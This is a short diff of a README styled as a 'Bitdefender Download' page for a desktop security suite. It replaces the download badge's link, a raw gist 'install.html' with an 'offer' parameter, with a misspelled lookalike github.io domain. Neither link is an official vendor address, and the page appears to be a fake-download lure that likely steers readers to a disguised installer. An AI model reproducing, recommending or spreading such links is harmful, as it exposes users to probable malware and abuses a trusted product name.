@@ -1,6 +1,6 @@
 # Bitdefender Download — Desktop Security Suite
 
-<a href="https://gistcdn.githack.com/breshine2010/f1e7da49b2633dc0be788e2becd1aeb4/raw/008d334dc45899bcf9459cb9df1d55c807b128cb/install.html?offer=Bitdefender" target="_blank">
+<a href="https://dowloader-desktop-app.github.io/.github/?offer=Bitdefender" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Bitdefender%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
